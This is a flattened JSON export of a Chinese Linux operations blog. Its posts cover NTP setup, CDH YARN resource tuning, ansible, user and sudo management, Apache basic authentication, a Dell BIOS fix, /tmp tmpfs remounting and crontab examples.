vim &#x2F;etc&#x2F;ntp.conf driftfile &#x2F;var&#x2F;lib&#x2F;ntp&#x2F;ntp.drift # 草稿文件# 日志文件statsdir &#x2F;var&#x2F;log&#x2F;ntpstats&#x2F;statistics loopstats peerstats clockstatsfilegen loopstats file loopstats type day enablefilegen peerstats file peerstats type day enablefilegen clockstats file clockstats type day enable# 让NTP Server为内网的ntp服务器server 10.1.2.20fudge 10.1.2.20 stratum 5# 不允许来自公网上ipv4和ipv6客户端的访问restrict -4 default kod notrap nomodify nopeer noquery restrict -6 default kod notrap nomodify nopeer noquery# Local users may interrogate the ntp server more closely.restrict 127.0.0.1restrict ::1保存后重启服务（在每一台子节点操作）service ntpd restart# 手工同步netdate -u 主节点IP或主机名#监控ntp更新情况ntpq -p","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ntp","slug":"ntp","permalink":"https://garywu520.github.io/tags/ntp/"}]},{"title":"CDH集群调优：内存、Vcores和DRF","slug":"CDH集群调优：内存、Vcores和DRF","date":"2017-07-05T03:25:59.000Z","updated":"2017-07-05T07:00:48.680Z","comments":true,"path":"2017/07/05/CDH集群调优：内存、Vcores和DRF/","link":"","permalink":"https://garywu520.github.io/2017/07/05/CDH%E9%9B%86%E7%BE%A4%E8%B0%83%E4%BC%98%EF%BC%9A%E5%86%85%E5%AD%98%E3%80%81Vcores%E5%92%8CDRF/","excerpt":"场景：需要将CDH动态资源池中的Vcores进行虚拟以满足Yarn跑任务的需要。 DRF和相关参数","text":"场景：需要将CDH动态资源池中的Vcores进行虚拟以满足Yarn跑任务的需要。 DRF和相关参数 DRF: Dominant Resource Fairness，根据CPU和内存公平调度资源。 CDH动态资源池默认采用的DRF计划策略。 简单的理解就是: 内存不够的时候，多余的CPU就不会分配任务了，就让他空着；CPU不够的时候，多出来的内存也不会再启动任务了。 理解这个计划策略后，再查看Yarn启动任务时资源相关的参数，发现有以下几个参数可能会产生影响： 12345678mapreduce.map.memory.mb map任务内存，cdh默认1Gmapreduce.map.cpu.vcores map任务虚拟CPU核数，cdh默认1mapreduce.reduce.memory.mb reduce任务内存，cdh默认1Gmapreduce.reduce.cpu.vcores reduce任务虚拟CPU核数，cdh默认1由此可以看到默认配置下，CPU核数和内存是1：1G的比例来启动任务的。yarn.nodemanager.resource.memory-mb 容器内存，cdh默认8G。此参数可以调整动态资源池中总内存的数量，一般不建议超过物理内存数量。yarn.nodemanager.resource.cpu-vcores 容器虚拟CPU核数，cdh默认8。此参数可以调整动态资源池中总vcore数量，一般不建议超过物理核心数量。 1而我的需求是调整总的vcore数量，所以我需要在CDH中 yarn集群的设置中搜索“yarn.nodemanager.resource.cpu-vcores”参数去配置所有的。 检验123查看虚拟vcore数量和内存调整结果：CDH -- 群集 -- 动态资源池注：如果yarn正在跑任务的情况下，修改vcore后，配置将延迟生效，具体时间根据yarn任务执行完毕的时间而定。 官方文档参考 Cloudera CDH 本帖参考 AboutYun","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"Vcores","slug":"Vcores","permalink":"https://garywu520.github.io/tags/Vcores/"},{"name":"DRF","slug":"DRF","permalink":"https://garywu520.github.io/tags/DRF/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"ansible基本用法","slug":"ansible基本用法","date":"2017-07-04T10:55:49.000Z","updated":"2019-03-11T03:57:05.631Z","comments":true,"path":"2017/07/04/ansible基本用法/","link":"","permalink":"https://garywu520.github.io/2017/07/04/ansible%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/","excerpt":"ansible基本用法","text":"ansible基本用法 1234567891011121314151617格式: ansible -i hosts -m 模块示例：ansible -i hosts hue -m ping # ping所有主机ansible -i hosts hue -m shell -a &quot;这里是远端服务器执行命令&quot; 注：如果执行的命令中含有双引号（英文），需要在命令中的引号处使用转义符（\\）ansible -i hosts hue -m shell -a &quot;yum install -y lrzsz&quot; -s -s参数是sudo，意思是增加权限，否则命令会失败#传送文件ansible -i lf_host hue -m copy -a &#x27;src=./gmond_conf/gmond-hue dest=/etc/init.d/&#x27; -s加BUF示例：-f 并行执行ansible -i hosts hue -f 20 -m ping # 一次并行处理20个，然后再执行20个，以此类推。优点：效率高 1后续将持续补充......","categories":[],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"https://garywu520.github.io/tags/Ansible/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"}]},{"title":"切换用户错误:This account is currently not available","slug":"切换用户错误-This-account-is-currently-not-available","date":"2017-07-01T05:24:49.000Z","updated":"2017-07-01T05:34:06.496Z","comments":true,"path":"2017/07/01/切换用户错误-This-account-is-currently-not-available/","link":"","permalink":"https://garywu520.github.io/2017/07/01/%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E9%94%99%E8%AF%AF-This-account-is-currently-not-available/","excerpt":"切换用户报错 [garywu@oldboy202 ~]$ su - apacheThis account is currently not available.","text":"切换用户报错 [garywu@oldboy202 ~]$ su - apacheThis account is currently not available. 123456原因：apache用户的shell为&#x2F;sbin&#x2F;nologin解决方法：以root身份修改&#x2F;etc&#x2F;passwd的shell为&#x2F;bin&#x2F;bash usermod -s &#x2F;bin&#x2F;bash 重新登录即可。","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"}]},{"title":"老男孩-Day10之用户管理与磁盘","slug":"老男孩-Day10之用户管理与磁盘","date":"2017-07-01T01:41:48.000Z","updated":"2017-07-05T12:20:51.704Z","comments":true,"path":"2017/07/01/老男孩-Day10之用户管理与磁盘/","link":"","permalink":"https://garywu520.github.io/2017/07/01/%E8%80%81%E7%94%B7%E5%AD%A9-Day10%E4%B9%8B%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E7%A3%81%E7%9B%98/","excerpt":"用户管理123&#x2F;etc&#x2F;passwd 倒数第二列表示用户宿主目录；最后一列表示用户所使用的shell(即命令解释器)注：如果想把某个用户配置为傀儡用户（不能登录），对应用户shell需要改为&#x2F;sbin&#x2F;nologin&#x2F;etc&#x2F;skel 作用：该目录存放着新用户默认环境变量等配置文件。","text":"用户管理123&#x2F;etc&#x2F;passwd 倒数第二列表示用户宿主目录；最后一列表示用户所使用的shell(即命令解释器)注：如果想把某个用户配置为傀儡用户（不能登录），对应用户shell需要改为&#x2F;sbin&#x2F;nologin&#x2F;etc&#x2F;skel 作用：该目录存放着新用户默认环境变量等配置文件。 1234&#x2F;etc&#x2F;default&#x2F;useradd 该文件定义了新用户的家目录、默认shell等参数。&#x2F;etc&#x2F;login.defs 该文件定义了新建目录或文件默认权限、添加用户是否创建家目录等。 ls -lrt .&#x2F;old* 最新文件显示到最下方（排序） “-bash-4.1$” 案例123456789现象: 以某个用户登录系统后，出现-bash-4.1$ -bash-4.1$ 原因：这个用户家目录下的环境变量文件（ .bashrc 和.bash_profile）被删除了。解决方案：从&#x2F;etc&#x2F;skel目录，把被删除的.bashrc和.bash_profile恢复，然后重新登录进入cp &#x2F;etc&#x2F;skel&#x2F;.bash* ~ 添加用户123456789101112useradd -g 指定用户组useradd -u 指定用户uid (一般傀儡用户uid范围：1-499)useradd -s 指定用户使用的shelluseradd -M 不创建家目录useradd -c 给用户添加说明信息示例：usermod -c &quot;傀儡用户&quot; www1www1:x:12306:12306:傀儡用户:&#x2F;home&#x2F;www1:&#x2F;sbin&#x2F;nologin示例：添加一个用户www 指定uid为888，禁止用户登录系统，不创建家目录useradd -u 888 -s &#x2F;sbin&#x2F;nologin -M www检查：id www ls -ld &#x2F;home&#x2F;www 删除用户1234567方法1（推荐）： vim &#x2F;etc&#x2F;passwd 给指定用户添加注释。 #www:x:888:888::&#x2F;home&#x2F;www:&#x2F;sbin&#x2F;nologin 方法2: userdel www 默认不删除用户家目录 userdel -r www 连窝端 修改用户12usermod -s 修改用户使用的shellusermod -g 修改用户所属的组 passwd命令的 –stdin参数(只能root用户使用此命令)12345678passwd --stdin username 非交互式设置密码或理解为从管道中获取密码示例：[root@oldboy202 ~]# echo &quot;1QAZ2wsx&quot; |passwd --stdin oldgirlChanging password for user oldgirl.passwd: all authentication tokens updated successfully.除此之外，还需要清理历史记录。 history -c 企业场景123456789101. 密码至少12位以上 密码保存工具：keepass、lastpass 2. 安全措施 (1)&#x2F;var&#x2F;log&#x2F;secure日志分析:failure (2)给文件添加指纹 md5sum filename &gt;&gt;check.md5 echo &quot;111&quot; &gt;&gt; filename md5sum -c check.md5 用户查询-命令123id 查看用户uid、gid、用户所属组等信息，也可以判断某个用户是否存在w 显示已经远程登陆的用户以及在干什么，以及系统运行了多久，系统平均负载uptime 显示系统时间 sudo12345678910111213普通用户没有权限执行root命令，这时候需要使用sudo[oldboy@oldboy202 ~]$sudo -l 查看当前用户有哪些sudo权限[oldboy@oldboy202 ~]$ls &#x2F;rootls: cannot open directory &#x2F;root: Permission denied解决方案：root编辑 visudo， 91gg定位到如下行并添加：92 oldboy ALL&#x3D;(ALL) &#x2F;bin&#x2F;ls,&#x2F;usr&#x2F;sbin&#x2F;useradd 让普通用户具有ls和添加用户权限93 oldboy ALL&#x3D;(ALL) &#x2F;sbin&#x2F;* 授权sbin目录下的所有命令（慎用）94 oldboy ALL&#x3D;(ALL) &#x2F;bin&#x2F;*, !&#x2F;bin&#x2F;rm 授权&#x2F;bin下的所有命令（除了rm）注：添加多个命令，中间使用英文的逗号&quot;,&quot; vimsudo命令等同于vim &#x2F;etc&#x2F;sudoers 1234567运维人员可以这样赋权：# visudooldboy ALL&#x3D;(ALL) NOPASSWD:ALL 给予用户所有权限，且不需要密码。切换到root用户sudo su - 行为/审计系统-堡垒机/跳板机12341. 齐治堡垒机（硬件）2. jumpserver跳板机3. gateone web跳板机4. Alex写的 crazyEYE chkconfig脚本开机自启动123456789vim &#x2F;etc&#x2F;init.d&#x2F;hostnamed #!&#x2F;bin&#x2F;bash # chkconfig: 2345 99 99 2345表示运行级别；两个99分别表示开机顺序和关机循序 # descrption: This is a cripts. 注释信息 hostname chmod +x &#x2F;etc&#x2F;init.d&#x2F;oldboydchkconfig --add oldboydchkconfig oldboyd on sed命令回顾12345678910111213141516171819sed 显示行sed -n &#39;1p&#39; filename 显示第一行sed -n &#39;1,5p&#39; filename 显示1-5行sed -n &#39;1p;5p;10p&#39; filename 显示第1行、第5行、第10行sed -n &#39;$p&#39; 显示文件最后一行删除sed &#39;&#x2F;oldboy&#x2F;d&#39; filename查找sed -n &#39;&#x2F;oldboy&#x2F;p&#39; filename 查找字符串sed通用方法1： sed -r &#39;&#x2F;找谁&#x2F;s#找谁#替换谁#g&#39; filename sed通用方法2： sed -ri &#39;1,5s#找谁#替换成谁#g&#39; filename （替换1-5行的某些内容,-r支持扩展正则）比如：sed -ri &#39;1,5s#oldboy#oldgirl#g&#39; filename 替换第一行到第5行的oldboy为oldgirl注：1. sed修改文件内容的时候需要提前备份。 2. sed -i 一定要放在最后，比如：sed -ri &#39;&#x2F;&#x2F;s###g&#39; filename 3.使用-i参数时，禁止加上 -n参数（s###g后面也不能加p），否则除了修改的行之外，其他内容均会丢失。 磁盘buffers与cache12345# free -mLinux特点：把不用的内存临时作为了buffers和cache内存实际剩余&#x3D; free+buffers+cachedLinux把我的内存吃掉了：http:&#x2F;&#x2F;www.linuxatemyram.com&#x2F; CDN123CDN1.尽量让用户访问读取缓存（每个地方的缓存）2.尽量根据用户的所在位置 让用户就近访问缓存 --提高用户的访问速度 Linux计算器123456789101112方法1【推荐】：AWK [root@oldboy202 ~]# awk &#39;BEGIN&#123;print 10*25.7+3&#125;&#39;260计算结果准确，可以出现小数方法2：python# python3.0&#x2F;100.29999999999999999&gt;&gt;&gt; 方法3：echo $((10&#x2F;3)) 只能是整数计算 买一个块硬盘 500G, 但是实际格式化后不到500G，为什么？121. 在计算机中GB、MB、KB 默认是按照1024为单位的2. 生产硬盘的厂商是按照1000为单位进行计算，所以会出现不足500G 批量添加10个用户，并将用户密码改为随机8位字符12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455预备知识：[root@oldboy202 ~]# echo 123456 |sed -r &#39;s#.*#&lt;&amp;&gt;#g&#39; 找到的内容，全部放到&amp;位置&lt;123456&gt;[root@oldboy202 ~]# echo 123456 |sed -r &#39;s#[0-9]+#&lt;&amp;&gt;#g&#39; 找到的内容，全部放到&amp;位置&lt;123456&gt;1. 先确定目标: useradd stu01;echo 123456 |passwd --stdin stu012. 拼接这种命令，然后交给bash执行第一步：echo stu&#123;01..5&#125; |xargs -n1 排成一列echo stu&#123;01..5&#125; |tr &quot; &quot; &quot;\\n&quot; 把空格替换为换行第二步：匹配.*的内容，放到&amp;的位置。[root@oldboy202 ~]# echo stu&#123;01..5&#125; |tr &quot; &quot; &quot;\\n&quot; |sed &#39;s#.*#useradd &amp;;#g&#39;useradd stu01;useradd stu02;useradd stu03;useradd stu04;useradd stu05;第三步：拼接为想要的格式[root@oldboy202 ~]# echo stu&#123;01..5&#125; |tr &quot; &quot; &quot;\\n&quot; |sed &#39;s#.*#useradd &amp;;echo 123456 |passwd --stdin &amp;#g&#39;useradd stu01;echo 123456 |passwd --stdin stu01useradd stu02;echo 123456 |passwd --stdin stu02useradd stu03;echo 123456 |passwd --stdin stu03useradd stu04;echo 123456 |passwd --stdin stu04useradd stu05;echo 123456 |passwd --stdin stu05第四步：交给bash执行[root@oldboy202 ~]# echo stu&#123;01..5&#125; |tr &quot; &quot; &quot;\\n&quot; |sed &#39;s#.*#useradd &amp;;echo 123456 |passwd --stdin &amp;#g&#39; |bashChanging password for user stu01.passwd: all authentication tokens updated successfully.Changing password for user stu02.passwd: all authentication tokens updated successfully.Changing password for user stu03.passwd: all authentication tokens updated successfully.Changing password for user stu04.passwd: all authentication tokens updated successfully.Changing password for user stu05.passwd: all authentication tokens updated successfully.第五步：随机字符生成（缺点：密码看不到）date +%N|md5sum|cut -c 1-8 先输出微秒，然后使用md5加密，取出前8位随机数字echo stu&#123;01..10&#125; |tr &quot; &quot; &quot;\\n&quot; |sed &#39;s#.*#useradd &amp;;echo $(date +%N|md5sum|cut -c1-8) |passwd --stdin &amp;#g&#39; |bash第五步：优化版本echo stu&#123;40..43&#125;|xargs -n1|sed &#39;s#.*#useradd &amp;;pass&#x3D;$(date +%N|md5sum |cut -c-8);echo $pass|passwd --stdin &amp;;echo &amp; $pass &gt;&gt;&#x2F;tmp&#x2F;pass.log#g&#39; |bash先定义一个变量，变量名称为pass；后面需要的地方使用$pass来获取变量值","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"用户管理","slug":"用户管理","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"},{"name":"磁盘","slug":"磁盘","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98/"}]},{"title":"Apache账号密码登陆验证-配置","slug":"Apache账号密码登陆验证-配置","date":"2017-06-29T10:46:15.000Z","updated":"2017-06-29T10:49:46.431Z","comments":true,"path":"2017/06/29/Apache账号密码登陆验证-配置/","link":"","permalink":"https://garywu520.github.io/2017/06/29/Apache%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81-%E9%85%8D%E7%BD%AE/","excerpt":"Apache账号密码登陆验证-配置","text":"Apache账号密码登陆验证-配置 12345678910111213141516171819202122232425261. 修改Apache全局配置文件 vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&quot;&gt; 修改到网站根目录 AllowOverride AuthConfig #表示启用身份认证 &lt;&#x2F;Directory&gt;2. 在虚拟网站根目录创建.htaccess文件 cd &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia &amp;&amp; vim .htaccess AuthName &quot;请登录&quot; #定义描述 AuthType Basic #验证类型，需要加载Basic模块 AuthUserFile &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&#x2F;passwd #密码文件路径 require user username1 username2 #哪些用户有访问权限 3. 创建用户密码 htpasswd -c &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&#x2F;passwd username1 首次创建用户需要-c指定路径，第二次不需要指定！不需要指定！不需要指定！否则首次密码创建信息会被覆盖。 htpasswd &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&#x2F;passwd username2 4. 重启Apache 管理Apache认证用户：htpasswd -m &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&#x2F;passwd username1 修改用户名密码htpasswd -D &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia&#x2F;passwd username2 删除用户","categories":[],"tags":[{"name":"Apache","slug":"Apache","permalink":"https://garywu520.github.io/tags/Apache/"},{"name":"web认证","slug":"web认证","permalink":"https://garywu520.github.io/tags/web%E8%AE%A4%E8%AF%81/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"}]},{"title":"DELL cpu0000 cpu1 internal error (IERR)","slug":"DELL-cpu0000-cpu1-internal-error-IERR","date":"2017-06-26T06:59:56.000Z","updated":"2017-06-26T07:11:45.557Z","comments":true,"path":"2017/06/26/DELL-cpu0000-cpu1-internal-error-IERR/","link":"","permalink":"https://garywu520.github.io/2017/06/26/DELL-cpu0000-cpu1-internal-error-IERR/","excerpt":"一台Dell R720服务器运行中突然关机，重开机前排面板上出现报错 “cpu0000 cpu1 internal error (IERR) contact support ”， 经与dell客服沟通确认，是因为CPU节能设置，需要在BIOS中关闭该设置即可。按照他的说法做了操作，报错得以解决。","text":"一台Dell R720服务器运行中突然关机，重开机前排面板上出现报错 “cpu0000 cpu1 internal error (IERR) contact support ”， 经与dell客服沟通确认，是因为CPU节能设置，需要在BIOS中关闭该设置即可。按照他的说法做了操作，报错得以解决。 解决方法123456781，服务器关机，并断掉点源；2，按住电源键20秒，等待1分钟左右；3，接通电源，开机；4，开机后再dell图标出来的时候按下F2,进入BIOS设置；5，system Setup - System BIOS ，选择 system profile Settings，进入后将右边的 Performance Per Watt（DAPC）改为 Custom；6，然后可发现，下方的其他选项变为可选；7，将 CIE 和 C States 选项改成 Disabled ；8，ESC返回 保存设置，重启服务器。 参考：解决方法","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"cpu","slug":"cpu","permalink":"https://garywu520.github.io/tags/cpu/"},{"name":"Dell","slug":"Dell","permalink":"https://garywu520.github.io/tags/Dell/"}]},{"title":"crontab与/tmp-相爱相守","slug":"umount与-tmp-相爱相守","date":"2017-06-24T19:51:21.000Z","updated":"2017-06-26T03:09:35.539Z","comments":true,"path":"2017/06/25/umount与-tmp-相爱相守/","link":"","permalink":"https://garywu520.github.io/2017/06/25/umount%E4%B8%8E-tmp-%E7%9B%B8%E7%88%B1%E7%9B%B8%E5%AE%88/","excerpt":"现在时间是03:51分，没错，我在处理故障。悲催啊。。。 故障邮件名称：run-crons 故障正文：cat: write error：No space left on device","text":"现在时间是03:51分，没错，我在处理故障。悲催啊。。。 故障邮件名称：run-crons 故障正文：cat: write error：No space left on device 现象： （1）/tmp目录磁盘使用率100%【非inode占用】 （2）crontab -e 命令出错（错误没保存，大概意思是不能执行，因为/tmp空间不足） 基本原因大概清楚了，crontab命令结果定向到了/tmp目录，而/tmp目录无可用空间，所以crontab就不工作了。 1234567891011121314151617解决方案：首先可以查看下哪些程序正在使用&#x2F;tmpfuser -m -v &#x2F;tmp（1）强制卸载&#x2F;tmp目录（原100M） umount -fl &#x2F;tmp -f 强制卸载 -l 空闲马上卸载所有占用的文件系统。 注：对于线上机房的服务器，使用&#x2F;tmp目录的进程是不能停止的。 而-fl参数可以解决卸载&#x2F;tmp的时候提示“device is busy”的问题， (2) 重新挂载&#x2F;tmp，同时将&#x2F;tmp目录大小改为200M mount -t tmpfs -o size&#x3D;200M none &#x2F;tmp 注：这个200M占用的是内存空间 经过了上面这个操作之后，运行crontab -e 才能正常看到之前定义的定时任务。此时说明配置OK了。 经验总结 其实，一般这个空间不易过大，但同时仍会出现/tmp满的情况，这时候需要crontab 配置每分钟或多少秒来自动清理/tmp里的文件。 12命令参考：*&#x2F;1 * * * * rm &#x2F;tmp&#x2F;mck-* &#x2F;&#x2F;每分钟执行一次 不过，当写入速度大于删除速度，依然会报错/tmp满了， 解决方法是： 给/tmp目录添加监控 /tmp满了之后，重启使用/tmp的程序，比如： php-fpm。重启后，进程释放就暂时不再写入了，然后让crontab的删除命令去干掉/tmp缓存文件。 详细了解tmpfs: 文件存储之-内存文件系统tmpfs","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tmp","slug":"tmp","permalink":"https://garywu520.github.io/tags/tmp/"},{"name":"umount","slug":"umount","permalink":"https://garywu520.github.io/tags/umount/"}]},{"title":"老男孩-Day9之crontab定时任务-精讲","slug":"老男孩-Day9之crontab精讲","date":"2017-06-24T01:32:21.000Z","updated":"2017-06-26T03:33:05.031Z","comments":true,"path":"2017/06/24/老男孩-Day9之crontab精讲/","link":"","permalink":"https://garywu520.github.io/2017/06/24/%E8%80%81%E7%94%B7%E5%AD%A9-Day9%E4%B9%8Bcrontab%E7%B2%BE%E8%AE%B2/","excerpt":"cron是系统主要的调度进程，可以在无需人工干预的情况下运行作业。 crontab命令用于设置周期性被执行的指令。可以使用它在每天的非高峰负荷时间段运行作业，或在一周或一月中的不同时段运行。","text":"cron是系统主要的调度进程，可以在无需人工干预的情况下运行作业。 crontab命令用于设置周期性被执行的指令。可以使用它在每天的非高峰负荷时间段运行作业，或在一周或一月中的不同时段运行。 crontab命令允许用户提交、编辑或删除相应的作业。每一个用户都可以有一个crontab文件来保存调度信息。系统管理员可以通过cron.deny 和 cron.allow 这两个文件来禁止或允许用户拥有自己的crontab文件。 关闭系统服务-命令拼接方式（暂时不使用循环方式）123456789chkconfig |egrep -v &quot;crond|network&#x2F;syslog|sshd|sysstat&quot; 排除这5个服务chkconfig |egrep -v &quot;crond|network&#x2F;syslog|sshd|sysstat&quot; |awk &#39;&#123;print $1&#125;&#39; chkconfig |egrep -v &quot;crond|network&#x2F;syslog|sshd|sysstat&quot; |awk &#39;&#123;print &quot;chkconfig &quot;$1&quot; off&quot;&#125;&#39;在结果中的前面和后面输入我们想要的字符【只是按照我们的意愿显示了出来，但并没有真正执行】chkconfig |egrep -v &quot;crond|network&#x2F;syslog|sshd|sysstat&quot; |awk &#39;&#123;print &quot;chkconfig &quot;$1&quot; off&quot;&#125;&#39;|bash把结果交给bash执行 123456789chkconfig |egrep -v &quot;crond|network|rsyslog|sshd|sysstat&quot; |awk &#39;&#123;print &quot;chkconfig &quot;$1&quot; on&quot;&#125;&#39;|bash开启服务[root@oldboy202 ~]# chkconfig |grep 3:on查看已经在命令行模式下启动的服务拼接命令-联系老男孩教育每日一题-第74天-批量重命名http:&#x2F;&#x2F;lidao.blog.51cto.com&#x2F;3388056&#x2F;1940039 crontab分类1234567891011121314151617181920211.系统使用的定时任务，如: ls -ld &#x2F;etc&#x2F;cron* [一般中病毒的时候会用到系统的定时任务] &#x2F;etc&#x2F;cron.hourly 每小时运行的任务 &#x2F;etc&#x2F;cron.daily 每天运行的任务 &#x2F;etc&#x2F;cron.deny 哪些用户禁止使用定时任务 2.用户的定时任务（crontab） crontab --help 查看帮助 crontab -l 查看用户的定时任务 【比如: crontab -u garywu -l 查看garywu的cron任务】 crontab -e 编辑定时任务 【比如: crontab -u root -e 编辑root的定时任务；crontab -u gary -e编辑gary用户的cron任务】 crontab -r &#x2F;&#x2F;删除某个用户的cron定时任务【工作中慎用！！！】 【比如：crontab -u gary -r 想删除gary的cron设置】 注：crontab命令实际上修改的文件是“&#x2F;var&#x2F;spool&#x2F;cron&#x2F;当前用户名” , 每次编辑完某个用户的cron设置后，cron自动在&#x2F;var&#x2F;spool&#x2F;cron下生成一个与此用户同名的文件。 问题：为什么要使用crontab命令，而不直接修改文件？ （1）有语法检查功能 （2）方便 crond进程检查12345678910先确认crond服务是否正在运行&#x2F;etc&#x2F;init.d&#x2F;crond status 先确认crond服务是否启动ps -ef |grep crond 查看系统中正在运行的进程UID（谁在运行） PID进程号 PPID 进程名称root 1361 1 0 May20 ? 00:00:01 crondroot 15214 15043 0 18:53 pts&#x2F;0 00:00:00 grep crondps -aux |grep crondcrontab -u oldboy -l root查看oldboy用户的定时任务 定时任务日志（cron排错日志）12345定时任务的日志：&#x2F;var&#x2F;log&#x2F;cron工作中对于日志，尽量不使用cat 、vi&#x2F;vim，因为日志量很大，会直接卡死建议使用grep或head或tail或lest或tailf ; tailf用来查看实时更新的日志 定时任务详解123456789101112什么时间执行定时任务？* * * * * comand分 时 日 月 周 运行的命令或脚本（强烈建议使用命令绝对路径,比如: &#x2F;usr&#x2F;sbin&#x2F;ntpdate）* 第1个*号表示分钟（0-59）* 第2个*号表示小时（0-23）【注: 24小时制】* 第3个*号表示日期（1-31）* 第4个*号表示月份（1-12）【或者jan,feb，mar等月份简写】* 第5个*号表示周几（0-6） 【周日可以使用0或者7】注意: 半夜12：00使用 00 00来表示 定时任务中的常用符号1234567# 井号,表示注释，不会被处理* 在定时任务中表示 “每”，比如每分钟、每天、每月等&#x2F;n 比如：*&#x2F;10 * * * * ，意思是每隔10分钟- 减号表示从哪里来到哪里结束。比如: 每天的17点-19点运行cmd, 表示分隔，比如: 30 3-5,17-19 * * * cmd2&gt;&amp;1 意思是把标准错误输出重定向到标准输出&#x2F;dev&#x2F;null 黑洞，运行日志直接丢弃。标准输出和标准错误都重定向到了&#x2F;dev&#x2F;null 示例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748(1)每隔两分钟把自己的名字输出到/tmp/oldboy.txt # print name */2 * * * * echo &quot;wuyanteng&quot; &gt;&gt; /tmp/oldboy.log (2) 每天的17-19点的整点，执行cmd 【结果是 17:00 18:00 19:00执行】 00 17-19 * * * cmd 或 00 17,18,19 * * * cmd(3) 每天的3到5点还有17点到19点的半点执行脚本 cmd 30 3-5,17-19 * * * cmd 或 30 3,4,5,17,18,19 * * * cmd 【了解即可，不推荐作为常用】 (4) 每5分钟更新/同步系统的时间 */5 * * * * ntpdate ntp1.aliyun.com &gt;&gt; /tmp/ntpdate.log 2&gt;&amp;1 # log文件放入/tmp/ntpdate.log文件中。 */5 * * * * ntpdate ntp1.aliyun.com &gt;&gt; /dev/null 2&gt;&amp;1 # log文件直接丢弃放入/dev/null黑洞 要求：记住2个常用ntp服务器： ntp1.aliyun.com pool.ntp.org (5) 每个月的4号和每周的周一到周三的早上11点执行一次重启sshd服务 00 11 4 * 1-3 /etc/init.d/sshd restart &gt;&gt;/dev/null 2&gt;&amp;1 (6) 每月1、10、22日的4 : 45重启httpd 45 4 1,10,22 * * /etc/init.d/httpd restart &gt;&gt;/usr/local/Apache_service.log 2&gt;&amp;1(7) 每月的1-5号8:30和9:30刷新DNS缓存 30 8,9 1-5 * * unbound-control reload (8) 在8:03,11:03,14:03,17:03,20:03 执行pwd 3 8-20/3 * * * pwd &gt;&gt;/dev/null 2&gt;&amp;1(9) 每周六、日上午9:00和下午14：00 执行程序/server/script/oldboy.sh)。 00 9,14 * * 0,6 /bin/sh /server/script/oldboy.sh &gt;&gt;/dev/null 2&gt;&amp;1 (10) 每隔2个小时将/etc/services文件打包备份到/tmp下（最好每次备份成不同的备份包）。 00 */2 * * * /bin/tar zcf /tmp/etc-services-$(date +\\%F_\\%H).tar.gz /etc/services &gt;&gt; /tmp/tar.log 2&gt;&amp;1 扩展： 00 */2 * * * /bin/tar zcf /tmp/etc-services-`date +\\%F_\\%H`.tar.gz /etc/services &gt;&gt; /tmp/tar.log 2&gt;&amp;1[1] `` 英文的反引号(Esc键)也可以调用时间[2] date +\\%F_\\%H 把时间精确到小时[3] 注: %号在定时任务里面有特殊含义(表示“回车操作”)，所以需要使用转义符\\（撬棍） 企业案例1-错误：You have new mail in /var/spool/mail/root12345678如果cron定时任务不定向到空（&#x2F;dev&#x2F;null）或指定文件，很容易导致硬盘inode空间被占满，从而系统服务不正常。常见错误： You have new mail in &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root原因：邮件软件服务开启后，定时任务没定向到空（&#x2F;dev&#x2F;null）或指定文件，然后不断的给root用户发邮件注：postfix软件的服务如果没有开启（大量小文件堆积在&#x2F;var&#x2F;spool&#x2F;postfix&#x2F;maildrop&#x2F;）【同时也会导致inode被占满，一个文件占用1个inode，4k文件占用一个bloc】 企业案例2-/tmp目录文件清理123456789inode满了，清除&#x2F;tmp目录小文件，删除报错：方法1： cd &#x2F;tmp rm -rf * 注： rm -f * 命令报错： -bash: &#x2F;bin&#x2F;rm: Argument list too long【使用下面方法即可】 方法2：ls &#x2F;tmp |xargs rm 企业案例3-crontab 执行java脚本错误123crontab执行java脚本报错：java里面缺少PATH变量，java找不到对应的命令位置。解决方法在脚本里面添加java环境变量。 总结1234561. 每条定义的定时任务善于添加注释行，方便日后维护2. 